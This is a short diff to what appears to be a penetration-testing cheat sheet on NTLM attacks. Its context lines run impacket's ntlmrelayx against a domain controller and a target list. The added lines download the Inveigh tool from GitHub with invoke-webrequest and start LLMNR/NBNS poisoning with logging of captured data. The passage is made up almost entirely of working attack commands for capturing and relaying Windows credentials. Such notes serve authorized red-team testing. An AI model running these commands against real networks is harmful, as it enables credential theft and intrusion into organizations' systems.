@@ -46,3 +46,12 @@ python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t dc01.domain.lo
 python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support --no-http-server --signing-required
 ```
 
+# Windows
+
+```
+invoke-webrequest https://github.com/Kevin-Robertson/Inveigh -o inveigh
+
+import-module .\Inveigh.ps1
+Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+
